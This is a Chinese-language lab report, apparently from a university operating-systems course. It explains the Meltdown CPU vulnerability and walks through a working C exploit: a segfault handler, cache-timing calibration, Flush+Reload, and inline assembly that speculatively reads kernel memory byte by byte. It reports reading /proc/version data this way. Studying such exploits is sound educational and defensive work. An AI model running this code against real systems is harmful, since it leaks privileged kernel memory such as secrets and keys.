# meltdown攻击实验报告

## 一 攻击原理

### 1 乱序执行

指令在CPU中执行可分为三个阶段：

（1）取指令、解码后将指令送到各自的保留站（Reservation Station）中保存下来。若操作数在寄存器中，则将操作数和指令一起放入保留站；若操作数还在计算中，则将那条计算指令的识别信息保存

（2）操作数准备好后，保留站将操作数和可执行指令送入流水线，并将结果保存在一个结果序列中

（3）指令退休，重新排列结果序列并进行安全检查，结果送入寄存器

可见如果指令只是被加载而未执行，不会进行安全检查。

当发生越权访问时，由于乱序执行而提前被加载的指令会被处理器丢弃，但这些指令对缓存的操作不会被重置，可以利用这一点进行侧信道攻击。

### 2 侧信道攻击

采用Flush+Reload方式

（1）将被监控的内存的映射从cache中剔除

（2）在（3）之前，允许其访问内存

（3）测量重新载入内存的时间，如果在（2）阶段目标访问了指定内存空间，那么在cache中已有记录，重新载入需要的时间很短；而如果没有访问，则需要很长时间

## 二 攻击步骤

### 1 准备工作

首先通过argv参数获取攻击地址和攻击范围

```c
sscanf(argv[1], "%lx", &addr);//将地址转为无符号16进制数
sscanf(argv[2], "%lx", &size);//将范围转为无符号16进制数
```

设置信号处理函数，当捕捉到段错误信号时修改指令寄存器rip

```c
void sigsegv(int sig, siginfo_t *siginfo, void *context)
{
    ucontext_t *ucontext = context;//用于更改上下文 
    ucontext->uc_mcontext.gregs[REG_RIP] = (unsigned long)stop;//将下一条指令位置改为stop的值
}

int set_signal(void)
{
    struct sigaction act = 
    {
        .sa_sigaction = sigsegv,//设置信号处理函数
        .sa_flags = SA_SIGINFO,//信号附带的参数可以被传递到信号处理函数中
    };
    
    return sigaction(SIGSEGV, &act, NULL);//捕捉段错误信号，并传递相关参数
}
```

为当前进程分配CPU核

```c
static void pin_cpu0()
{
    cpu_set_t mask;		//声明一个CPU集
    /* PIN to CPU0 */
    CPU_ZERO(&mask);	//清空CPU集
    CPU_SET(0, &mask); 	//将0号CPU加入CPU集
    sched_setaffinity(0, sizeof(cpu_set_t), &mask);//让当前进程运行在mask设定的CPU即0号CPU上
}
```

为区分数据是否在cache中，分别测定数据在cache中和不在cache中时的读取数据时间，然后求临界值

```c
int get_access_time(volatile char *addr)//测定访问数据时间
{
    unsigned long long begin, end;
    unsigned i;
    begin = __rdtscp(&i);//读取时间戳计数器的值
    (void)*addr;		//访问数据
    end = __rdtscp(&i);	//再次读取时间戳计数器的值
    return end-begin;	//差值可衡量访问数据的时间
}

static void set_cache_hit_threshold(void)		//计算临界时间
{
    long cached, uncached, i;
    
    for (cached = 0, i = 0; i < 1000000; i++)
        cached += get_access_time(hack_array);	//保证数据已进入cache
    
    for (cached = 0, i = 0; i < 1000000; i++)
        cached += get_access_time(hack_array);	//测定访问在cache中数据的时间
    
    for (uncached = 0, i = 0; i < 1000000; i++)
    {
        _mm_clflush(hack_array);//清空相应缓存
        uncached += get_access_time(hack_array);//测定访问不在cache中数据的时间
    }
    
    cached /= 1000000;	//取平均值
    uncached /= 1000000;//取平均值
    
    cache_hit_threshold = sqrt(cached * uncached);//计算临界值
    
    printf("cached = %ld, uncached = %ld, threshold %d\n",
           cached, uncached, cache_hit_threshold);
}
```

以只读方式打开文件/proc/version，此时准备工作完成

```c
fd = open("/proc/version", O_RDONLY);
if (fd < 0)
{
    perror("open");
    return -1;
}
```

### 2 Flush

使即将用于缓存的hack_array数组线性地址的缓存线失效，由于页面大小为4k，每隔4k地址清空一次

```c
void clflush_target(void)
{
    int i;
    for (i = 0; i < VARIANTS_READ; i++)
        _mm_clflush(&hack_array[i * PAGE_SIZE]);
}
```

调用mfence，确保在执行speculate之前所有指令都已被执行完

```c
_mm_mfence();
```

### 3 speculate（包括reload）

使用内联汇编，分析见注释

```c
static void __attribute__((noinline))speculate(unsigned long addr)
{
    asm volatile 
    (
        "1: ;" 
               
        ".rept 300;"		//将加法指令循环执行300次，使处理器能乱序执行
        "add $0x141, %%rax;"
        ".endr;"
                  
        "movzx (%[addr]), %%rax;"	//将目标内核地址对应数据（下称data）存入rax中，此指令将发生段错误
        
        //由于乱序执行，接下来3条指令在处理器开始处理段错误之前已被加载
        "shl $12, %%rax;"			//将data左移12位，即*4k
        "jz 1b;"					//若结果为0，跳转
        "movzx (%[target], %%rax, 1), %%rbx\n"	//此时为reload阶段，将hack_array[data*4k]的值存入rbx
        //对执行结果重新排列并进行安全检查，发现越权访问，丢弃所有结果，但不会恢复cache的状态
        //而之前已将hack_array[data*4k]所在页加载到缓存中，接下来可进行侧信道攻击
                  
        "stop: nop;"//sigaction函数捕捉到段错误信号后将rip设为nop指令所在地址，程序跳转到此处继续执行
        :		//无输出数
        : [target] "r" (hack_array),	//输入数为hack_array和addr
        [addr] "r" (addr)
        : "rax", "rbx"					//rax和rbx被修改
    );
}
```

### 4 probe

调用check函数，分析见注释

```c
static int probe[256];	//数组大小为256，用于判断要监听的一位数据是0到255的哪一个
void check(void)
{
    int i, time, mix_i;
    volatile char *addr;
    
    for (i = 0; i < 256; i++)
    {
        mix_i = ((i * 167) + 13) & 255;	//乱序生成0到255的数
        
        addr = &hack_array[mix_i * PAGE_SIZE];
        time = get_access_time(addr);	//测定访问数据时间
        
        if (time <= cache_hit_threshold)
            //若访问时间小于临界值，说明hack_array[mix_i*4k]所在页已被加载到cache
        	probe[mix_i]++;//mix_i可能就是被监听的数据，为使结果更准确，外面循环1000次，多次进行时间测定
    }
}
```

最后取probe数组中的最大值所对应的下标（在probe中的位置）即为1位被监听数据。

要读取的数据大小为size，循环size次，每次读地址自加，就能得到所有数据。

## 三 预期结果

想要读取文件/proc/version中70字节的数据，编写run.sh脚本找到开始地址，使用gdb调试

![p1](https://github.com/OSH-2018/4-jiachenglian/blob/master/1.png)

在speculate发生段错误，继续执行，调用sigsegv函数，修改rip

![p1](https://github.com/OSH-2018/4-jiachenglian/blob/master/2.png)

跳回speculate继续执行

![p1](https://github.com/OSH-2018/4-jiachenglian/blob/master/3.png)

程序执行结果与实际数据对比

![p1](https://github.com/OSH-2018/4-jiachenglian/blob/master/4.png)

可见准确读出了前70字节的数据

